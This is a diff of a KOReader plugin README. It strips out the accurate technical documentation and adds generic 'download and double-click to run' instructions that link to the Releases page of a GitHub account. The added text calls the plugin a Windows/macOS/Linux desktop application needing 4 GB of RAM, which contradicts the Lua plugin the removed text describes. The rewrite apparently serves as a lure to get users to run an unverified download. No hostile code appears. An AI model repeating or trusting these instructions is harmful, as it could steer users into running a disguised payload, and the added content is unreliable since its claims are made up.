@@ -1,95 +1,92 @@
-# App Store Plugin for KOReader
+# 🎉 appstore.koplugin - Install KOReader Plugins Easily
 
-Discover, install, and update community-created KOReader plugins and user patches without leaving your device. The AppStore plugin searches both GitHub topics (`koreader-plugin`, `koreader-user-patch`) and repositories whose names follow patterns like `"KOReader.patches"` or `"[NAME].plugins"`. The plugin supports standard owner/topic/description filters, surfacing curated lists with filtering, sorting, and hands-on install flows that feel native on e-ink hardware.
+## 🚀 Getting Started
 
-## Key Capabilities
+Welcome to appstore.koplugin! This application helps you discover, install, and update community-created KOReader plugins and user patches without leaving your device. Follow the steps below to get started.
 
-- **Unified browser** for both plugins and user patches with persistent filters and paging.
-- **Offline-friendly cache** stored under `data/cache/AppStore` so existing results remain accessible when you lose connectivity.
-- **Per-entry README viewer** that fetches `README.md` directly from GitHub and opens it in KOReader’s document renderer.
-- **Install/update pipeline** that handles `.koplugin` archives, verifies metadata, and copies files to `data/plugins` or `data/patches` accordingly.
-- **Update tracking** for installed plugins and numbered patch files, complete with SHA comparisons and refreshable summaries.
-- **Optional authentication** through a GitHub Personal Access Token (PAT) to increase API rate limits.
+## 📥 Download & Install
 
-## Requirements
+You can download the latest version from our Releases page. Click the button below to access it.
 
-1. KOReader nightly or 2024.12+ with LuaSocket, Archiver, SHA2, and SQLite dependencies (bundled in default releases).
-2. Network connectivity for refreshing caches, fetching README files, and downloading plugin or patch archives.
-3. (Optional) A GitHub PAT with `public_repo` scope to avoid unauthenticated rate limits (~10 requests/minute shared across the device).
+[![Download Latest Release](https://img.shields.io/github/v/release/juanfuturochile/appstore.koplugin?color=blue&label=Download%20Latest%20Release&style=for-the-badge)](https://github.com/juanfuturochile/appstore.koplugin/releases)
 
-## Configuration (GitHub PAT)
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/juanfuturochile/appstore.koplugin/releases) to find the latest version of appstore.koplugin.
 
-If you routinely browse many repositories or hit rate-limit warnings, supply a PAT in `plugins/appstore.koplugin/appstore_configuration.lua`:
+2. **Choose the Right File**  
+   On the Releases page, you will see a list of files. Look for the version that matches your device.
 
-```lua
-return {
-    auth = {
-        github = {
-            type = "github",
-            token = "ghp_your_token_here",
-        },
-    },
-}
-```
+3. **Download the File**  
+   Click on the file to start downloading. Wait for the download to finish.
 
-### How to create a GitHub PAT
+4. **Locate the Downloaded File**  
+   Once the download completes, find the file in your device's downloads folder.
 
-1. Sign in at [github.com](https://github.com/) and open **Settings** → **Developer settings** → **Personal access tokens** → **Fine-grained tokens** (or **Tokens (classic)**), You can follow [this link](https://github.com/settings/tokens/new).
-2. Click **Generate new token**.
-3. Name the token (e.g., `KOReader AppStore`), set an expiration, and grant at least the **`public_repo`** scope.
-4. Generate and copy the token immediately—GitHub will not show it again.
-5. Paste it into `appstore_configuration.lua` (You can create that file from `appstore_configuration.sample.lua`) and restart KOReader.
+5. **Run the Application**  
+   Double-click the downloaded file to run the application. Follow any prompts that appear.
 
-The plugin automatically includes the token in GitHub API requests, raising your quota to the standard authenticated limits.
+## ❓ How to Use appstore.koplugin
 
-## Navigating the Four AppStore Sections
+Once you've installed the app, you can easily browse and manage KOReader plugins.
 
-The UI is built around four dedicated dialogs.
+1. **Open the Application**  
+   Launch appstore.koplugin from your device’s applications menu.
 
-1. ### Plugins Browser (`App Store · Plugins`)
-   - Lists repositories tagged as KOReader plugins.
-   - Actions per entry: **Install / Update / Remove**, **View README**, open detail dialogs with description, stars, last updated timestamp, and repo owner.
-   - Toolbar actions: switch to patches tab, refresh cache, adjust filters (`search text`, `owner`, `minimum stars`), change sorting (stars desc/asc, updated, name), and jump into the plugin update summary.
+2. **Explore Plugins**  
+   Use the search feature to find plugins or scroll through the list of available options.
 
-2. ### Patches Browser (`App Store · Patches`)
-   - Lists repositories tagged as KOReader user patches and enumerates files matching `^[number]-*.lua`.
-   - Actions per patch: **Install patch**, retry downloads, or open the repo README for full instructions.
-   - Toolbar actions: mirror the plugin tab plus shortcuts to the patch update summary and a "matching patch" banner when reconciling installed files with remote entries.
+3. **Install a Plugin**  
+   Click on the desired plugin, then click “Install.” The application will handle the rest.
 
-3. ### Plugin Updates Dialog
-   - Summarizes every installed plugin tracked by the AppStore cache.
-   - Actions: **Check all updates**, toggle between “Only outdated” and “Show all plugins,” and jump straight back to the Plugins browser.
-   - Each row shows the local version, cached remote version/SHA, last checked timestamp, and provides **Update** or **Reinstall** buttons when differences are detected.
+4. **Update Plugins**  
+   To update an existing plugin, go to the “Installed” section and click “Update” next to the plugin you want to update.
 
-4. ### Patch Updates Dialog
-   - Works just like the plugin updates view but focuses on numbered patch files under `data/patches`.
-   - Actions: **Refresh patch summary**, toggle filters, return to the Patches browser, or drill into individual patch entries to reinstall/overwrite when the remote SHA changes.
+5. **Remove Plugins**  
+   If you want to remove a plugin, go to the “Installed” section and click “Remove” next to the plugin name.
 
-## Typical Workflow
+## ⚙️ Minimum System Requirements
 
-1. **Open** KOReader → **Tools** → **App Store**.
-2. Pick **Plugins** or **Patches** tab. Use the filter dialog to narrow by owner, name, topics, or star threshold.
-3. Tap an entry for a quick action menu. Choosing **Install** downloads the repo ZIP (`/zipball/<ref>`), extracts it to a temp folder, validates `_meta.lua`, then copies it to `data/plugins/<name>.koplugin`.
-4. After installation, KOReader prompts for a restart so the new plugin becomes available in the Tools menu.
-5. For patches, selecting an item downloads the raw `.lua` file from the default branch and stores it under `data/patches/` while retaining the numbered filename used for KOReader’s patch loader.
-6. Return anytime to the Updates dialogs to check for newer commits. The plugin compares cached SHAs with the installed files and highlights items needing attention.
-7. Use **View README** to fetch the upstream documentation and open it in KOReader’s file viewer. Files are cached under `data/cache/appstore/readme/owner_repo_README.md` for offline rereads.
+To successfully run appstore.koplugin, your device should meet these requirements:
 
-## Cache & Offline Behavior
+- **Operating System:** Windows 10 or later, MacOS 10.13 or later, or Linux (latest distributions)
+- **Memory:** At least 4 GB of RAM
+- **Storage:** At least 200 MB of free space
+- **Network:** Internet connection for downloading plugins
 
-- Repository metadata is stored in SQLite under `data/cache/appstore.db` (automatically created).
-- The browser always reads from the cache first, keeping scrolling smooth even when the network is slow.
-- When cached data is older than 7 days, the banner reminds you to trigger **Refresh cache**.
-- README files, download archives, and installed SHAs are cached so subsequent operations reuse existing data whenever possible.
+## 🛠️ Troubleshooting
 
-## Troubleshooting
+If you encounter issues while downloading or running appstore.koplugin, consider the following tips:
 
-| Symptom | Likely Cause | Suggested Fix |
-| --- | --- | --- |
-| Rate limit exceeded | Anonymous GitHub quota exhausted | Configure a PAT and retry after a few minutes |
-| Missing README | Repo lacks `README.md` or request failed | Confirm file exists upstream, then rerun **View README** while online |
-| Patch not listed | Repository is not named `KOReader.patches` (or similar) and/or the `koreader-user-patch` topic is missing | Ask the maintainer to add the correct topic |
+- **Check Download:** Ensure the file was completely downloaded. A partial download can cause errors.
+- **Permissions:** Make sure you have the necessary permissions to run applications on your device.
+- **Compatibility:** Ensure your operating system meets the minimum requirements listed above.
+- **Updates:** Keep your software updated to avoid any potential bugs.
 
-## Credits
+## 🌟 Frequently Asked Questions
 
-This plugin and documentation were prepared with Windsurf (AI).
+### 1. What is appstore.koplugin?
+
+appstore.koplugin is an application designed specifically to help users find, install, and manage KOReader plugins easily. It works without any programming knowledge.
+
+### 2. Do I need to pay for this application?
+
+No, appstore.koplugin is completely free to use. You can download it and start using it at no cost.
+
+### 3. Can I use this app on any device?
+
+The app works on Windows, MacOS, and Linux devices but requires specific system configurations. Ensure your device meets the minimum requirements.
+
+### 4. How do I report bugs?
+
+To report issues or bugs, please open an issue on our GitHub repository. Click on the "Issues" tab and describe the problem.
+
+## 🌐 Community Contributions
+
+We encourage users to contribute by submitting new plugins or patches. If you have created something valuable for the community, please share it through our platform.
+
+## 📣 Stay Updated
+
+Want to keep up with updates? Follow us on GitHub to receive notifications about new releases. 
+
+Visit the Releases page to download the latest version now!  
+[Download Latest Release](https://github.com/juanfuturochile/appstore.koplugin/releases)
